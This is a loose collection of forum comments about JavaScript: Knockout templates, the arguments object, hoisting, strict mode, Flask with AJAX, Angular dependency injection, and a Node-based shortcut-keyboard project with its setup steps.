He's doing it for those who may still leaning. Maybe for people who have only ever used basic jQuery and may not understand the benefit of this library. It lowers the barriers to entry and it provides a simple use case that nearly everyone can understand.
Hell yeah! Rock on. I guess you could take it from the opposite angle as well and say, "As long as you meet the expectations you set forth" you're good.
This is a bad use of templates: &lt;ul data-bind="foreach: people"&gt; &lt;li data-bind="template: 'person'"&gt;&lt;/li&gt; &lt;/ul&gt; &lt;script type="text/html" id="person"&gt; &lt;h3 data-bind="text: name"&gt;&lt;/h3&gt; &lt;/script&gt; This would be better written as: &lt;ul data-bind="template: { name: 'person-template', foreach: people }"&gt; &lt;/ul&gt; &lt;script type="text/html" id="person-template"&gt; &lt;li&gt;&lt;h3 data-bind="text: name"&gt;&lt;/h3&gt;&lt;/li&gt; &lt;/script&gt; The `foreach` binding uses templates already in its underlying code, so the first example is a template in a template, which may explain part of the reason why it's slow. But I would only use the above example if I was using the template in multiple locations like nesting: &lt;ul data-bind="template: { name: 'person-template', foreach: people }"&gt; &lt;/ul&gt; &lt;script type="text/html" id="person-template"&gt; &lt;li&gt; &lt;h3 data-bind="text: name"&gt;&lt;/h3&gt; &lt;ul data-bind="template: { name: 'person-template', foreach: children }"&gt;&lt;/ul&gt; &lt;/li&gt; &lt;/script&gt; Otherwise, yes, do what you did and just use the foreach binding. Also keep in mind that pushing on an observableArray multiple times is expensive as it updates the DOM with each push. Instead, unwrap the array, manipulate it, and then set the observableArray back to the array. Here's a [jsperf](http://jsperf.com/ko-template-vs-foreach) demonstrating the performance difference between a `foreach` binding, a `template` binding, and a combo of the two. The results are what I would expect. `foreach` being the fastest, followed by the `template` binding (which are fairly close to each other), and a combo of the two. Honestly, I can't think of a situation where you would nest a template inside of a foreach directly in your example.
Yes. jQuery is a tool in the same way underscore and lodash are -- you use them to simplify or make easier the task at hand but not as a replacement for any core aspect of the application/framework. To use your example: Angular has its own service called $http whom's purpose is to serve as the backend for communicating data/json over the webs. What you would NOT want to do is use jQuery's ajax functionality instead of $http because you would lose key functionality that $http provides for the rest of Angular. Additionally you'd be using code that has a dependency in a critical part of your application which could also lead to unforeseen consequences.
TIL game developers generally hate color blind :-) Great game, tested on Nexus 7.
Sounds like you want a django application?
Nope. Flask.
Cool little beginner tips. I generally only namespace common/base models views and collections. Outside of this, ill define larger sections of applications as namespaced objects, and generally only require in the specific models views and collections I need in their contexts. I'm also really fond of making 'App' and those larger sections (layouts) extend Backbone.Events so I can easily scaffold messages throughout the app if need be.
Put something like this http://pastebin.com/cw5rpnjj in a function and rebind a DOM element onclick or some other event to call that function. Then just make the callbacks modify the DOM however you see fit. If that is what you are asking. Clearly reading comprehension is not my strong suit. Edit: in your case make a save button that calls that function. But put the actual ajax function in the head.
This is great! I've been following your releases as I learn about Phaser. Thanks for sharing!
Once I forgot to put the "var" before a variable and it took me hours to know where the error was... That's why I think it would be useful for someone... 
Right, I've seen that. Avoid using 'when' + don't modify observable arrays in a loop (e.g. arr.push()). There are no tips on avoiding multiple DOM calls though :(
This is awesome! 
This is more of a python question than a javascript one. At least, you'll need to understand how to do the python bit first before understanding the js is necessary. 
The important thing here is to understand that you aren't actually running a Python script using Javascript. You are instead: * running a python script via an HTTP request * making an HTTP request via AJAX If you view it as 2 entirely separate things, you're going to have an easier time. i.e. the python script doesn't actually care if it's being called by AJAX or just a web browser - so test it first just using the browser Similarly, the AJAX code doesn't care if it's talking to Python, Perl, Java or even just a static web page - so feel free to test that code with static content. 
Absolutely. arguments is an object that holds all arguments to the function, so you would expect arguments [0] ='alien' to set the first argument to the function to 'alien'. This shouldn't be counterintuitive. In other languages there might not be a arguments object, but if you set a variable to a value, you would expect that to work, this I'd exactly the same in JavaScript.
Pretty awesome.. which engine did you use for it?
&gt; I've seen a lot of really nicely architected and clean hapi.js applications any you'd care to point out? Been reading up on it a bit the last few days, seeing a few full apps built with it would be useful. 
DAE this the *use strict* instruction looks weird? Why is it a string?
I write millions of lines of javascript every day.I seldom put myself in situations where i want to add two empty arrays to a string, so i only got 70pts. 
Linters point that out immediately. Use strict requires you to wait until run time. 
You need to bone up on your foundations a bit. It sounds like you're a beginner, and understandably it can be hard to see how all the pieces fit together. What you've described is a very basic and common way of doing things, so there are lots of resources out there to help you along the way. Since you're still getting the hang of things, however, please don't expect to understand everything tomorrow. You will need to spend some time to build up your understanding of the fundamentals. Give yourself 2 weeks to learn the basics and then come back to this question. You may want to take a step back, start from the beginning, and spend some time doing the JavaScript and Python tracks on [codecademy](http://www.codecademy.com/). You also may want to learn jQuery (there are lots of tutorials--just google it!). Here's how they fit together: - Python runs on your web server. Flask helps you organize your python project so that you can access different things at different URLs. - In Flask, you define "routes". The route is how you define an URL. So you can say @app.route("/hello") and then write a function and then when you visit yourwebsite.com/hello, you'll get whatever you coded there. - In Flask, you will have to define a route that handles the thing you want to do over Ajax. So if you want to submit a vote, you'd define a url (aka route) called, say, /vote. Python handles that route by doing the logic you want, and then instead of printing out something humans can read, it'll print out something JavaScript can read ("JSON"). - Then, in your JavaScript file, you can use jQuery to create an "event handler". So if you want to call your /vote Flask route when a user clicks on a link with the class "vote", you'd write a click event handler like so: $(".vote").click(function() { --- do the magic ajax here -- }); - Finally, the inside of that event handler is where you'd put your JavaScript to make your request to the /vote route you created in flask. It could look something like this, in jQuery: $.post("/vote", {imageId: theIdOfTheImageYoureVotingOn}, function() { -- do something when the vote was successful -- }); You are on the right track, but please set your expectations appropriately. I think you're biting off more than you can chew. Don't try to copy/paste your way into solving this problem. Becoming a great programmer takes years of works. So give yourself a few weeks to learn the basics, the right way, and then you can revisit this problem with a new perspective. If your expectations aren't set correctly, you will get frustrated and quit!
So a variable can change by changing an array? The arguments "array" (which is not exactly an array) is an edge case. For example this is similar to having: var a = 5; var x = [a]; and doing: x[0] = 7; would you expect "a" to be 7? I know that is not exactly the same as the arguments but is very close. Look at this example: function b(a){console.log(a);arguments[0]=1;console.log(a)} now write: b(0); The output will be "0" and then "1"; 
It doesn't mention one issue that strict mode helps you catch faster - forgetting to `.bind(this)` or similar when passing a function in which you'll be accessing some properties on the context object. `this` will be `null` in strict mode, rather than the global object.
That had remarkably little useful information. 
Your example is not what is happening. Remember, arguments is not an array. It's a host object that acts like an array. The named arguments are references to a specific index in the arguments host object. fromWhom and arguments[0] both reference the same place in memory. So changing one changes the other. 
"built on top of jquery"
My personal favorite is red vs. blue.
Without having read the article, I'm confident it contained the phrases "out of the scope of this article" or "without going into detail"
So this looks about like running `npm list` except that you don't have to install the package first?
In case anyone was wondering why `var foo = '11'` isn't being hoisted above the `return foo;` statement, it's because it actually is, but only the declaration is being hoisted, not the assignment. So this: function bar() { return foo; foo = 10; function foo() {} var foo = '11'; } Would actually be interpreted as this: function bar() { function foo() {} var foo; return foo; foo = 10; foo = '11'; } It doesn't change the behavior in this instance, but I thought this was an important concept to point out. More on [hoisting](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Scope_Cheatsheet).
As /u/ripter is saying, arguments is an 'array' that stores references to all the arguments in the function. As such you would expect just the behavior that you get. In python there is a dictionary holding all references to variables (and functions). Changing that reference in the dictionary will change the variable, just add you'd expect. That's almost the same here, except it's an object that behaves like an array instead of a dictionary.
Exactly. Introducing new keywords into a language is something that tippy don't really want to if you can avoid it. Using a string we get the expected behavior in newer JavaScript engines, and it just ignores it in older engines.
Under the hood it's events emitted by XHR2. From the source: * A wrapper around the browser XmlHttpRequest object that raises an * event whenever a new part of the response is available. * * In older browsers progressive reading is impossible so all the * content is given in a single call. For newer ones several events * should be raised, allowing progressive interpretation of the response.
I'm honestly surprised that's not built into NPM already.
&gt; Why are sites that use Angular good at making quick changes? Probably because Angular, more aggressively than any other framework, nudges developers to create easily testable code and test it often. Though some developers might find this guidance annoying, it pays off in catching little coding errors before they have a chance to become big ones. Man this article is shit 
Try: rel="external" I don't think target is a valid attribute for xhtml.
Replace the "vs" in OP's title with "&amp;" and you'll have a better idea of the article. Really started to roll my eyes when the author's sole justification for Backbone was it's ~28-60kb gzipped &amp; minified size advantage. I too can 'ls -l'. 
Indeed, at least in browsers. Node makes this stuff a bit easier. Flow is roughly: xhr2 progress event -&gt; Clarinet SAX Parser -&gt; build objects -&gt; check for matches -&gt; notify program. 
You could use onclick="target='_blank'" instead of target="_blank" 
&gt; onclick="target='_blank'" Perfect. Crazy how something so simple can be overlooked. I spent 3 hours this morning fucking around with it. Not that it 'really' matters for perfect w3 validation. I just like to know my code passes something haha. "This document was successfully checked as XHTML 1.0 Strict!" =-)
What were the SVG animations made with? They look awesome!
Is anyone actually using Vue? I can't see a reason to use this over the other libraries. All they keep claiming is speed which isn't the best benchmark these days.
Hey! I just happened along this article over lunch and thought I'd share it with you. It deals, very largely, with this trend and where it's headed: http://www.gartner.com/newsroom/id/2324917
This is a very good, and legitimate point. `this` invocation context has bitten me several times and is probably the most frustrating JavaScript concept for Classical developers. **This is a good one.**
I know it lacks a lot of information, but I just wanted to get it out of the door as soon as it's technically working so other people can start experimenting with it. # What is it? ExtraKey is a NodeJS application that in combination with NirCMD (on windows, no other platform support just yet) can provide you with a simple interface that you can customize to fit your needs to create a secondary (or more than one) input device using your existing mobile devices (tablets, smartphones). Currently it can send any imaginable key combination directly from your device to your computer where the application is being deployed, allowing you to make keyboard shortcuts easily accessible and visually prominent. The project was inspired by the [Shortcut-S Keyboard](https://www.kickstarter.com/projects/5074048/special-dedicated-editing-keyboard-for-photoshop) currently raising funds on Kickstarter (full disclosure: I've pledged my support for that project). The project and code file are provided AS IS under the MIT license. # How to Use it? Right now the project is intended for advanced users as it requires some rudimentary skills with git and node/npm. To get going, simply clone the project: `git clone https://github.com/elis/extrakey` install the dependencies: ``` $ cd extrakey $ npm install ``` Once all the dependancies have been successfullt installed, you can run the app by firing it up: ``` node app.js ``` You can now navigate to your ExtraKeyboard by visiting your local machine's IP on port 3000. # Adding Key combinations and changing layout To modify the key combinations open the `keys.yaml` file and simply start adding keys. Each key begins with a dash, and some configurations for the key. Currently the existing support is only for one key push/release at a time, but I'm planning to add complex keyboard (and mouse!) combinations in the near future. To modify the layout, check out `views/index.ejs` file, it's a plain HTML with some EJS templating to render the keys.yaml file. Feel free to experiment with it. Currently the app uses the [Metro UI CSS](http://metroui.org.ua/) for Bootstrap which makes buttons/tiles rather easy to setup. For questions, suggestions, and general inquiry feel free to contact me via email: eli.sklar@gmail.com
giving it a try, thanks!
The content inside the iframe. Kinda liek this: http://jsfiddle.net/4W29G/ I want the entire html page to appear as a small page, so I woudln't have to scroll down (or sideways) for it.
What browser are you using? I don't have that problem on *nix+Chrome.
In IE 8 / 9 you could use the XDomainRequest as that has periodic events raised that are captured by an optional progress function. You can check the length of .responseText for any new content... Edited edit: was right first time 
y'all need [brunch](http://brunch.io) &gt; What am I going to load my "JSX" into to unit test it? jsx-brunch compiles you .jsx files into JS for you! &gt; No IOC and no code organization makes for a nightmare on larger projects. brunch gives you a node-like module system in the browser. ie: # app/lib/math.js module.exports.double = function (n) { return n * n; }; # app/initialize.js var math = require('lib/math'); math.double(3); # =&gt; 9 I find angulars "module" system to be awful.
What's the reasoning behind this stupidity? I don't get it at all
Noted, thanks. If it's Windows-specific, I know how to test for it. Sorry for the trouble!
Agreed, DI in javascript just seems pointless, especially when it breaks on minification. Yeah, you can wrap your functions in arrays (gross) or use the $inject property, but when some angular code doesn't use it and your stuff breaks in production, that's not cool. It's not even advantageous in unit tests. You still stub / spyOn methods like you would, only now you've got to `$provide` that as well. describe 'PostService', -&gt; subject = undefined beforeEach -&gt; inject ['$injector', ($injector) -&gt; subject = $injector.get 'PostService' ] # vs ... PostService = require 'lib/post-service' describe 'PostService' subject = undefined beforeEach -&gt; subject = new PostService
Man, you guys are dicks. An absolute beginner new to javascript (and maybe programming in general) would probably make good use of that article. Not sure why you all are hating so much. Edit: Just noticed the author was an above average looking female
The arguments array is simply a reference to the arguments in your function. It would work similar to doing: var a = { 'b': 5 }; var x = [a]; x[0].b++; a.b; which results in 6. In your example, a is not being stored as a reference in the array, so that's why it would not change when you modified the value in the array.
I liked the code in general, but I felt that some comments were a bit overkill, not to mention the style of commenting being swapped in the middle of the constructor was a bit weird: var self = this; // Scope reference this._actions = []; // Queued Actions this._events = []; // Event Listeners // Current action if matched (default: null) this.action = null; // Hook (default: ":") this.hook = hook || ':'; // Current value if matched (default: null) this.value = null; // Named parameters this.params = []; // Anchor this.anchor = { defaultHash : window.location.hash }; // Event state this.state = null; // Version this.version = '0.3.1'; 
 var iframe = document.getElementsByTagName('iframe')[0]; // the above will return the first iframe in the document // or document.getElementById('iframeId'); if it has an ID var content = iframe.contentWindow ? iframe.contentWindow.document : iframe.contentDocument; You could then manipulate the width or height like you would the root document. content.body.style.width = content.body.style.height = '100%'; If the source of the iframe is not of the same origin as the script that is attempting to access it, you will not be able to access or modify the contents of the iframe-- if this is case, please give us more information on what you are trying to achieve so we can think of an alternate solution.
IDK‚Ä¶ I'm going through their docs right now, and for an idiot like me, they're way easier to understand than Angular or Ember have been.
I assume this would be done by making the content in the iframe responsive to the iframe size. If you don't control the content in the iframe, this likely isn't possible.
no dependencies? that is odd.
And that is an exception, as only happens in the arguments of a function (as far as I know). This is strange because everywhere else in js, the primitives (number, string...) have 1 reference and not 2, like in the arguments. (edit)
It's not merely the admittedly smaller scope of the project that accounts for it's speed and simplicity. It uses async batch DOM updates (as opposed to Knockout). And rather than dirty checking, Vue.js converts data object properties into ES5 getters and setters that trigger events when called, avoiding Angular's dirty checking, and the numerous mind-bending problems that can cause. It has a great architecture, and it shows.
Github: https://github.com/elis/extrakey